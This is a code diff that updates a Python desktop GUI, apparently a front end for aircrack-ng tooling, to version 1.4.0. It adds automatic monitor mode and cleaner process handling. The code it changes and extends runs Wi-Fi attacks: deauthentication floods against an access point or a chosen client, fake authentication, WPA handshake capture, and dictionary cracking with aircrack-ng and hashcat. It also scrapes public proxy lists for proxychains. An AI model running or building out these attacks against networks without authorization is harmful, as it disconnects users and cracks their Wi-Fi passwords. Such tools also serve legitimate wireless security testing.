@@ -8,6 +8,7 @@ import os
 import queue
 import re
 import shutil
+import signal
 import subprocess
 import sys
 import threading
@@ -27,7 +28,7 @@ except ImportError:
 HOME = Path.home() / ".acs"
 SESSION = HOME / "app-session.json"
 CONF = HOME / "proxychains.conf"
-APP_VER = "1.3.0"
+APP_VER = "1.4.0"
 APP_RAW = "https://raw.githubusercontent.com/iinze0/ACS-app/main/acs_app.py"
 APP_VERSION_URL = "https://raw.githubusercontent.com/iinze0/ACS-app/main/VERSION"
 
@@ -66,6 +67,61 @@ MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
 
 def have(cmd: str) -> bool:
     return shutil.which(cmd) is not None
+
+
+def iw_interfaces() -> list[str]:
+    if not have("iw"):
+        return []
+    try:
+        out = subprocess.check_output(["iw", "dev"], text=True, stderr=subprocess.DEVNULL)
+    except (subprocess.CalledProcessError, FileNotFoundError):
+        return []
+    return re.findall(r"Interface\s+(\S+)", out)
+
+
+def interface_type(name: str) -> str:
+    if not name:
+        return ""
+    try:
+        out = subprocess.check_output(["iw", "dev", name, "info"], text=True, stderr=subprocess.DEVNULL)
+    except (subprocess.CalledProcessError, FileNotFoundError):
+        return ""
+    match = re.search(r"type\s+(\S+)", out)
+    return match.group(1) if match else ""
+
+
+def is_monitor(name: str) -> bool:
+    kind = interface_type(name)
+    if kind:
+        return kind == "monitor"
+    return bool(name) and name.endswith("mon") and Path(f"/sys/class/net/{name}").exists()
+
+
+def pick_monitor_name(text: str, iface: str, names: list[str]) -> str:
+    for pattern in (
+        r"on\s+\[[^\]]+\]([A-Za-z0-9._-]+)",
+        r"monitor mode enabled on ([A-Za-z0-9._-]+)",
+    ):
+        for name in re.findall(pattern, text):
+            if name:
+                return name
+    candidate = f"{iface}mon"
+    if candidate in names or Path(f"/sys/class/net/{candidate}").exists():
+        return candidate
+    monitors = [name for name in names if name.endswith("mon")]
+    return monitors[0] if monitors else ""
+
+
+def valid_proxy(line: str) -> bool:
+    match = IP_RE.match(line.strip())
+    if not match:
+        return False
+    try:
+        port = int(match.group(2))
+        octets = [int(part) for part in match.group(1).split(".")]
+    except ValueError:
+        return False
+    return 1 <= port <= 65535 and all(0 <= octet <= 255 for octet in octets)
 
 
 def default_session() -> dict:
@@ -120,6 +176,7 @@ class App(tk.Tk):
         self.vars = {k: tk.StringVar(value=v) for k, v in self.session.items()}
         self.log_q: queue.Queue[str] = queue.Queue()
         self.proc: subprocess.Popen[str] | None = None
+        self.busy = False
         self.proxies: list[str] = []
         self.kind = tk.StringVar(value="socks5")
         self.hops = tk.StringVar(value="8")
@@ -360,7 +417,7 @@ class App(tk.Tk):
 
     def _page_scan(self) -> tk.Frame:
         page = tk.Frame(self.stage, bg=BG)
-        self._heading(page, "Networks", "Scan, then click an access point. Click a client to lock that station.")
+        self._heading(page, "Networks", "Scan turns monitor mode on by itself, then lists access points. Click one to lock it.")
         bar = tk.Frame(page, bg=BG)
         bar.pack(fill="x", pady=(0, 10))
         tk.Label(bar, text="DURATION", bg=BG, fg=MUTED, font=(UI, 8)).pack(side="left", padx=(0, 8))
@@ -549,10 +606,88 @@ class App(tk.Tk):
 
     def _need_mon(self) -> str | None:
         mon = self._vals()["mon"]
-        if mon and Path(f"/sys/class/net/{mon}").exists():
+        if mon and is_monitor(mon):
             return mon
-        self._write("no monitor interface — turn monitor mode on first")
+        found = next((name for name in iw_interfaces() if is_monitor(name)), "")
+        if found:
+            self.vars["mon"].set(found)
+            return found
+        self._write("no monitor interface — scan once to turn it on")
         return None
+
+    def _guard(self) -> bool:
+        if self.busy or (self.proc and self.proc.poll() is None):
+            self._write("something is already running — press Stop")
+            return False
+        return True
+
+    def _busy_on(self) -> None:
+        self.busy = True
+        self._set_busy(True)
+
+    def _busy_off(self) -> None:
+        self.busy = False
+        self.proc = None
+        self._set_busy(False)
+
+    def _kill(self, proc: subprocess.Popen[str]) -> None:
+        try:
+            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+        except (ProcessLookupError, PermissionError, OSError):
+            proc.terminate()
+
+    def _apply_radio(self, iface: str, mon: str) -> None:
+        if iface:
+            self.vars["iface"].set(iface)
+        self.vars["mon"].set(mon)
+        save_session(self._vals())
+
+    def _capture(self, args: list[str]) -> str:
+        self._write("$ " + " ".join(args))
+        try:
+            proc = subprocess.run(args, text=True, capture_output=True, timeout=40)
+        except subprocess.TimeoutExpired:
+            self._write("timed out")
+            return ""
+        except FileNotFoundError:
+            self._write(f"not found: {args[0]}")
+            return ""
+        text = ((proc.stdout or "") + (proc.stderr or "")).strip()
+        if text:
+            self._write(text)
+        return text
+
+    def _enable_monitor(self, iface: str, mon: str) -> str | None:
+        names = iw_interfaces()
+        if mon and is_monitor(mon):
+            self.after(0, lambda i=iface, m=mon: self._apply_radio(i, m))
+            return mon
+        existing = next((name for name in names if is_monitor(name)), "")
+        if existing:
+            managed = next((name for name in names if not is_monitor(name)), iface)
+            self.after(0, lambda i=managed, m=existing: self._apply_radio(i, m))
+            self._write(f"already in monitor mode: {existing}")
+            return existing
+        managed = [name for name in names if not is_monitor(name)]
+        if iface not in managed:
+            iface = managed[0] if managed else ""
+        if not iface:
+            self._write("no wireless interface")
+            return None
+        self._write(f"auto monitor on {iface}")
+        text = self._capture(["airmon-ng", "check", "kill"])
+        text += "\n" + self._capture(["airmon-ng", "start", iface])
+        found = pick_monitor_name(text, iface, iw_interfaces())
+        if not found and is_monitor(iface):
+            found = iface
+        if not found:
+            found = next((name for name in iw_interfaces() if is_monitor(name)), "")
+        if not found:
+            self._write("monitor interface did not come up")
+            return None
+        self.after(0, lambda i=iface, m=found: self._apply_radio(i, m))
+        self._write(f"monitor up: {found}")
+        return found
 
     def _need_bssid(self) -> str | None:
         bssid = self._vals()["bssid"]
@@ -581,12 +716,11 @@ class App(tk.Tk):
         self.after(120, self._drain)
 
     def _run(self, args: list[str], timeout: int | None = None) -> None:
-        if self.proc and self.proc.poll() is None:
-            self._write("something is already running — press Stop")
+        if not self._guard():
             return
+        self._busy_on()
 
         def work() -> None:
-            self.after(0, lambda: self._set_busy(True))
             self._write("$ " + " ".join(args))
             try:
                 self.proc = subprocess.Popen(
@@ -594,13 +728,14 @@ class App(tk.Tk):
                     stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT,
                     text=True,
+                    start_new_session=True,
                 )
                 assert self.proc.stdout is not None
                 if timeout:
                     try:
                         out, _ = self.proc.communicate(timeout=timeout)
                     except subprocess.TimeoutExpired:
-                        self.proc.kill()
+                        self._kill(self.proc)
                         out, _ = self.proc.communicate()
                         self._write(f"(stopped after {timeout}s)")
                     if out:
@@ -616,81 +751,55 @@ class App(tk.Tk):
             except Exception as exc:  # noqa: BLE001
                 self._write(str(exc))
             finally:
-                self.after(0, lambda: self._set_busy(False))
+                self.after(0, self._busy_off)
 
         threading.Thread(target=work, daemon=True).start()
 
     def _stop(self) -> None:
-        if self.proc and self.proc.poll() is None:
-            self.proc.terminate()
+        proc = self.proc
+        if proc and proc.poll() is None:
+            self._kill(proc)
             self._write("stopped")
+        elif self.busy:
+            self._write("stopping")
         else:
             self._write("nothing running")
+        self.busy = False
+        self._set_busy(False)
 
     def _detect(self) -> None:
         if not self._need("iw"):
             return
-        try:
-            out = subprocess.check_output(["iw", "dev"], text=True, stderr=subprocess.DEVNULL)
-        except subprocess.CalledProcessError:
-            self._write("iw dev failed")
-            return
-        names = re.findall(r"Interface\s+(\S+)", out)
+        names = iw_interfaces()
         if not names:
             self._write("no wireless interface")
             return
-        self.vars["iface"].set(names[0])
-        mon = next((n for n in names if n.endswith("mon")), "")
-        if mon:
-            self.vars["mon"].set(mon)
+        mon = next((name for name in names if is_monitor(name)), "")
+        managed = [name for name in names if name != mon and not is_monitor(name)]
+        self.vars["iface"].set(managed[0] if managed else names[0])
+        self.vars["mon"].set(mon)
         self._write("found " + ", ".join(names))
         self._save()
 
     def _monitor(self) -> None:
-        if not self._need("airmon-ng"):
+        if not self._guard() or not self._need("airmon-ng") or not self._need("iw"):
             return
         iface = self._vals()["iface"]
-        if not iface:
-            self._write("set an interface")
+        mon = self._vals()["mon"]
+        if not iface and not mon:
+            self._write("no wireless interface — plug in a card or press Detect wireless")
             return
-        if not messagebox.askyesno("ACS", f"Enable monitor mode on {iface}? This drops your Wi-Fi."):
+        if not messagebox.askyesno("ACS", f"Enable monitor mode on {iface or 'the wireless card'}? This drops your Wi-Fi."):
             return
-        if not self._need("airmon-ng"):
-            return
+        self._busy_on()
 
         def work() -> None:
-            self._run_sync(["airmon-ng", "check", "kill"])
-            self._run_sync(["airmon-ng", "start", iface])
-            mon = f"{iface}mon" if Path(f"/sys/class/net/{iface}mon").exists() else ""
-            if not mon:
-                try:
-                    out = subprocess.check_output(["iw", "dev"], text=True)
-                    mons = [n for n in re.findall(r"Interface\s+(\S+)", out) if n.endswith("mon")]
-                    mon = mons[0] if mons else ""
-                except subprocess.CalledProcessError:
-                    mon = ""
-            if mon:
-                self.vars["mon"].set(mon)
-                self._write(f"monitor up: {mon}")
-                self._save()
-            else:
-                self._write("monitor interface did not come up")
+            try:
+                self._enable_monitor(iface, mon)
+            finally:
+                self.after(0, self._busy_off)
 
         threading.Thread(target=work, daemon=True).start()
-
-    def _run_sync(self, args: list[str]) -> None:
-        self._write("$ " + " ".join(args))
-        try:
-            proc = subprocess.run(args, text=True, capture_output=True, timeout=40)
-        except subprocess.TimeoutExpired:
-            self._write("timed out")
-            return
-        except FileNotFoundError:
-            self._write(f"not found: {args[0]}")
-            return
-        text = (proc.stdout or "") + (proc.stderr or "")
-        if text.strip():
-            self._write(text.strip())
 
     def _restore(self) -> None:
         mon = self._vals()["mon"] or (self._vals()["iface"] + "mon")
@@ -715,33 +824,49 @@ class App(tk.Tk):
         self._run(["apt-get", "install", "-y", *pkgs])
 
     def _scan(self) -> None:
-        mon = self._need_mon()
-        if not mon or not self._need("airodump-ng"):
+        if not self._guard():
             return
-        HOME.mkdir(parents=True, exist_ok=True)
-        prefix = str(HOME / "scan")
-        for old in HOME.glob("scan-*.csv"):
-            old.unlink(missing_ok=True)
+        if not self._need("airodump-ng") or not self._need("airmon-ng") or not self._need("iw"):
+            return
+        try:
+            seconds = max(5, min(60, int(self.scan_for.get())))
+        except ValueError:
+            seconds = 15
+        iface = self._vals()["iface"]
+        mon = self._vals()["mon"]
+        self._busy_on()
 
         def work() -> None:
             try:
-                seconds = max(5, min(60, int(self.scan_for.get())))
-            except ValueError:
-                seconds = 15
-            self.after(0, lambda: self._set_busy(True))
-            self._write(f"scanning {mon} for {seconds}s")
-            cmd = ["airodump-ng", "--band", "abg", "--output-format", "csv", "-w", prefix, mon]
-            if have("timeout"):
-                cmd = ["timeout", str(seconds), *cmd]
-            try:
-                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=seconds + 8)
-            except subprocess.TimeoutExpired:
-                pass
-            csvs = sorted(HOME.glob("scan-*.csv"), key=lambda p: p.stat().st_mtime, reverse=True)
-            rows = parse_airodump(csvs[0]) if csvs else []
-            clients = parse_clients(csvs[0]) if csvs else []
-            self.after(0, lambda: self._fill_aps(rows, clients))
-            self.after(0, lambda: self._set_busy(False))
+                active = self._enable_monitor(iface, mon)
+                if not active:
+                    return
+                HOME.mkdir(parents=True, exist_ok=True)
+                for old in HOME.glob("scan-*"):
+                    if old.suffix in {".csv", ".cap", ".netxml"} or old.name.endswith(".kismet.csv"):
+                        old.unlink(missing_ok=True)
+                prefix = str(HOME / "scan")
+                self._write(f"scanning {active} for {seconds}s")
+                proc = subprocess.Popen(
+                    ["airodump-ng", "--band", "abg", "--output-format", "csv", "-w", prefix, active],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    start_new_session=True,
+                )
+                self.proc = proc
+                try:
+                    proc.wait(timeout=seconds)
+                except subprocess.TimeoutExpired:
+                    self._kill(proc)
+                    proc.wait(timeout=5)
+                csvs = sorted(HOME.glob("scan-*.csv"), key=lambda path: path.stat().st_mtime, reverse=True)
+                rows = parse_airodump(csvs[0]) if csvs else []
+                clients = parse_clients(csvs[0]) if csvs else []
+                self.after(0, lambda found=rows, stations=clients: self._fill_aps(found, stations))
+            except Exception as exc:  # noqa: BLE001
+                self._write(str(exc))
+            finally:
+                self.after(0, self._busy_off)
 
         threading.Thread(target=work, daemon=True).start()
 
@@ -812,6 +937,8 @@ class App(tk.Tk):
         self._run(["aireplay-ng", "--fakeauth", "0", "-a", bssid, "-e", essid, mon], timeout=20)
 
     def _handshake(self) -> None:
+        if not self._guard():
+            return
         mon = self._need_mon()
         bssid = self._need_bssid()
         if not mon or not bssid or not self._need("airodump-ng") or not self._need("aireplay-ng"):
@@ -819,41 +946,47 @@ class App(tk.Tk):
         vals = self._vals()
         cap = vals["cap"] or str(HOME / "handshake")
         chan = vals["channel"] or "6"
+        self._busy_on()
 
         def work() -> None:
-            self._write("capturing handshake for 20s")
-            dump = [
-                "airodump-ng",
-                "-c",
-                chan,
-                "--bssid",
-                bssid,
-                "-w",
-                cap,
-                mon,
-            ]
-            proc = subprocess.Popen(dump, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            self.proc = proc
-            client = vals["client"]
-            deauth = ["aireplay-ng", "--deauth", "6", "-a", bssid]
-            if MAC_RE.match(client):
-                deauth += ["-c", client]
-            deauth.append(mon)
-            subprocess.run(deauth, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=20)
             try:
-                proc.wait(timeout=12)
-            except subprocess.TimeoutExpired:
-                proc.terminate()
-            caps = sorted(Path(cap).parent.glob(Path(cap).name + "-*.cap"), key=lambda p: p.stat().st_mtime, reverse=True)
-            if not caps:
-                self._write("no capture written")
-                return
-            word = vals["wordlist"]
-            if Path(word).is_file() and have("aircrack-ng"):
-                self._write(f"cracking {caps[0].name}")
-                self._run_sync(["aircrack-ng", "-w", word, "-b", bssid, str(caps[0])])
-            else:
-                self._write(f"saved {caps[0]}")
+                self._write("capturing handshake for 20s")
+                proc = subprocess.Popen(
+                    ["airodump-ng", "-c", chan, "--bssid", bssid, "-w", cap, mon],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    start_new_session=True,
+                )
+                self.proc = proc
+                client = vals["client"]
+                deauth = ["aireplay-ng", "--deauth", "6", "-a", bssid]
+                if MAC_RE.match(client):
+                    deauth += ["-c", client]
+                deauth.append(mon)
+                subprocess.run(deauth, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=20)
+                try:
+                    proc.wait(timeout=12)
+                except subprocess.TimeoutExpired:
+                    self._kill(proc)
+                    proc.wait(timeout=5)
+                caps = sorted(
+                    Path(cap).parent.glob(Path(cap).name + "-*.cap"),
+                    key=lambda path: path.stat().st_mtime,
+                    reverse=True,
+                )
+                if not caps:
+                    self._write("no capture written")
+                    return
+                word = vals["wordlist"]
+                if Path(word).is_file() and have("aircrack-ng"):
+                    self._write(f"cracking {caps[0].name}")
+                    self._capture(["aircrack-ng", "-w", word, "-b", bssid, str(caps[0])])
+                else:
+                    self._write(f"saved {caps[0]}")
+            except Exception as exc:  # noqa: BLE001
+                self._write(str(exc))
+            finally:
+                self.after(0, self._busy_off)
 
         threading.Thread(target=work, daemon=True).start()
 
@@ -893,6 +1026,8 @@ class App(tk.Tk):
         self._run(["hcxdumptool", "-i", mon, "-w", str(out), "--rds=1"], timeout=25)
 
     def _hashcat(self) -> None:
+        if not self._guard():
+            return
         if not self._need("hcxpcapngtool") or not self._need("hashcat"):
             return
         pcap = HOME / "hcx.pcapng"
@@ -904,13 +1039,17 @@ class App(tk.Tk):
             self._write(f"wordlist missing: {word}")
             return
         digest = HOME / "hash.hc22000"
+        self._busy_on()
 
         def work() -> None:
-            self._run_sync(["hcxpcapngtool", "-o", str(digest), str(pcap)])
-            if digest.is_file() and digest.stat().st_size:
-                self._run_sync(["hashcat", "-m", "22000", str(digest), word, "--force"])
-            else:
-                self._write("no hashes in that capture")
+            try:
+                self._capture(["hcxpcapngtool", "-o", str(digest), str(pcap)])
+                if digest.is_file() and digest.stat().st_size:
+                    self._capture(["hashcat", "-m", "22000", str(digest), word, "--force"])
+                else:
+                    self._write("no hashes in that capture")
+            finally:
+                self.after(0, self._busy_off)
 
         threading.Thread(target=work, daemon=True).start()
 
@@ -933,7 +1072,7 @@ class App(tk.Tk):
                     self._write(f"failed {url} ({exc})")
                     continue
                 for line in text.splitlines():
-                    if IP_RE.match(line.strip()):
+                    if valid_proxy(line):
                         found.add(line.strip())
             picks = list(found)
             picks.sort()
@@ -1005,8 +1144,10 @@ class App(tk.Tk):
         threading.Thread(target=work, daemon=True).start()
 
     def _close(self) -> None:
-        self._stop()
-        self._save()
+        proc = self.proc
+        if proc and proc.poll() is None:
+            self._kill(proc)
+        save_session(self._vals())
         self.destroy()
 
 
@@ -1014,12 +1155,19 @@ def parse_airodump(path: Path) -> list[tuple[str, str, str, str, str]]:
     rows: list[tuple[str, str, str, str, str]] = []
     text = path.read_text(errors="replace")
     for line in text.splitlines():
-        parts = [p.strip() for p in line.split(",")]
-        if len(parts) < 14:
+        if line.startswith("Station MAC"):
+            break
+        if line.startswith("BSSID,"):
             continue
+        bits = line.split(",")
+        if len(bits) < 14:
+            continue
+        parts = [part.strip() for part in bits[:13]]
         if not MAC_RE.match(parts[0]):
             continue
-        essid = parts[13]
+        essid = ",".join(bits[13:]).strip()
+        if essid.endswith(","):
+            essid = essid[:-1].strip()
         if essid.lower() in {"essid", ""} and parts[3] == "":
             continue
         enc = " ".join(x for x in (parts[5], parts[6], parts[7]) if x)
